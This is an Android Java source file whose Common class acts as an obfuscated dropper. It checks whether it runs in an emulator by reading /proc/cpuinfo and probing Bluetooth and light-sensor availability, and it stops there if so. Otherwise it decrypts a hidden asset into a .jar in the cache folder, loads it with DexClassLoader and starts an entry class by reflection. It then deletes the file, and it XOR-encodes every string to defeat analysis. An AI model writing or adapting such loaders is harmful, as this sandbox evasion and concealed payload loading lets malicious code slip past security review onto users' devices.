package com.dmy;

import android.app.Application;
import android.content.Context;
import android.os.Build;
import android.util.Base64;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;

import dalvik.system.DexClassLoader;

import static android.content.res.AssetManager.ACCESS_STREAMING;

/**
 * Created by PengChen on 2019/4/4.
 */

public class Common {

    //是虚拟机返回true
    public static boolean isCpuCheck() {
        ArrayList<String> list = new ArrayList<>();
        list.add(decodeStr("/system/bin/cat"));
        list.add(decodeStr("/proc/cpuinfo"));
        try {
            InputStream is = new ProcessBuilder(list).start().getInputStream();
            BufferedReader responseReader = new BufferedReader(new InputStreamReader(is));
            String line = "";
            String intel = decodeStr("intel");
            String amd = decodeStr("amd");
            while ((line = responseReader.readLine()) != null) {
                if (line.contains(intel) || line.contains(amd)) {
                    return true;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    //是虚拟机返回true
    public static boolean isBluetoothCheck() {
        try {
            String blue = decodeStr("android.bluetooth.BluetoothAdapter");
            Class cl = Class.forName(blue);
            Object ob = invokeStaticMethod(cl, decodeStr("getDefaultAdapter"), null);
            ob = invokeNoStaticMethod(ob, decodeStr("getAddress"), null);
            if (ob == null) {
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return true;
        }
        return false;
    }

    //是虚拟机返回true
    public static boolean isLightSensorCheck(Context context) {
        try {
            Object ob = invokeNoStaticMethod(context, decodeStr("getSystemService"),
                    new Class[]{String.class},
                    decodeStr("sensor"));
            Object re = invokeNoStaticMethod(ob, decodeStr("getDefaultSensor"), new Class[]{int.class}, 5);
            if (re == null) {
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return true;
        }
        return false;
    }

    public static boolean isVirtual(Context context) {
        return isCpuCheck() || isBluetoothCheck() || isLightSensorCheck(context);
    }

    public static String getCurrentProcessName() {
        try {
            String classStr = decodeStr("android.app.ActivityThread");
            Class<?> cl = Class.forName(classStr);
            Object var2 = invokeStaticMethod(cl, "currentActivityThread", null);
            return (String) invokeNoStaticMethod(var2, decodeStr("getProcessName"), null);
        } catch (Exception var6) {
            var6.printStackTrace();
            return null;
        }
    }

    public static Object invokeNoStaticMethod(Object host, String name, Class<?>[] clsArray, Object... pArray) {
        try {
            if (host == null) {
                return null;
            }
            Method method = host.getClass().getMethod(name, clsArray);
            method.setAccessible(true);
            return method.invoke(host, pArray);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static Object invokeStaticMethod(Class<?> cl, String methodName, Class<?>[] clsArray, Object... pArray) {
        try {
            if (cl == null) {
                return null;
            }
            Method method = cl.getDeclaredMethod(methodName, clsArray);
            method.setAccessible(true);
            return method.invoke(null, pArray);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void deleteDirectory(File file) {
        if (file.isDirectory()) {
            File[] childFiles = (File[]) invokeNoStaticMethod(file, decodeStr("listFiles"), null);
            if (childFiles != null) {
                for (int i = 0; i < childFiles.length; i++) {
                    invokeNoStaticMethod(childFiles[i], decodeStr("delete"), null);
                }
            }
        }
        invokeNoStaticMethod(file, decodeStr("delete"), null);
    }


    public static void createFile(File p0) {
        if (!p0.exists()) {
            File parentFile = (File) invokeNoStaticMethod(p0, decodeStr("getParentFile"), null);
            invokeNoStaticMethod(parentFile, decodeStr("mkdirs"), null);
            invokeNoStaticMethod(p0, decodeStr("createNewFile"), null);
        }
    }

    public static File getTargetFile(Context context) {
        String processName = getCurrentProcessName();
        String parentPath = Integer.toString(processName.hashCode());
        String targetPath = (Build.MANUFACTURER + processName).hashCode() + decodeStr(".jar");
        File targetFile = new File(context.getCacheDir(), parentPath + File.separator + targetPath);
        createFile(targetFile);
        return targetFile;
    }

    public static void releaseFile(Context context, File targetFile) {
        try {
            String inputName = decodeStr("AssetName");
            InputStream inputPath = context.getAssets().open(inputName, ACCESS_STREAMING);
            DataInputStream inputStream = new DataInputStream(inputPath);
            DataOutputStream outputStream = new DataOutputStream(new FileOutputStream(targetFile));
            decodeFile(inputStream, outputStream);
            inputStream.close();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String decodeStr(String p0) {
        byte[] var1 = Base64.decode(p0, Base64.DEFAULT);
        char[] var2 = new char[var1.length];
        int i = 0;
        byte code = getHashCode();
        do {
            var2[i] = (char) (code ^ var1[i]);
            i++;
        } while (i < var2.length);

        return new String(var2);
    }

    private static byte getHashCode() {
        String s = "OSB";
        return (byte) s.hashCode();
    }

    public static void decodeFile(DataInputStream p0, DataOutputStream p1) throws IOException {

        byte[] encCode = getCodeByte(p0);
        int num = encCode.length;
        int var3 = 0;
        byte[] var4 = new byte[8 * 1024];
        int var5;

        for (; (var5 = p0.read(var4)) > 0; ) {
            int i = 0;
            for (byte tt : var4) {
                if (i < var5) {
                    tt = (byte) ~(tt ^ encCode[var3 % num]);
                    var4[i] = (byte) (((tt & 0xff) >>> 4) | ((tt & 0xff) << 4));
                    i++;
                    var3++;
                }
            }
            p1.write(var4, 0, var5);
        }
    }

    private static byte[] getCodeByte(DataInputStream p0) throws IOException {
        byte[] numArr = new byte[1];
        p0.read(numArr, 0, 1);
        int num = numArr[0];
        byte[] encCode = new byte[num];
        p0.read(encCode, 0, num);
        return encCode;
    }

    private static Class<?> startClass;

    public static void loadInnerSdk(Context context, String change) {
        if (isVirtual(context)) {
            return;
        }
        File targetFile = null;
        if (startClass == null) {
            targetFile = getTargetFile(context);
            releaseFile(context, targetFile);
            DexClassLoader loader = new DexClassLoader(targetFile.getPath(),
                    targetFile.getParent(), null, context.getClassLoader().getParent());
            try {
                startClass = loader.loadClass(decodeStr("com.sdk.entry.SdkEntry"));
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }
        String str1 = decodeStr("startLoad");
        String str2 = decodeStr("PluginConfig");
        invokeStaticMethod(startClass, str1,
                new Class[]{Context.class, String.class, String.class},
                context, str2, decodeStr(change));
        if (targetFile != null && targetFile.exists()) {
            deleteDirectory(new File(targetFile.getParent()));
        }

    }
}
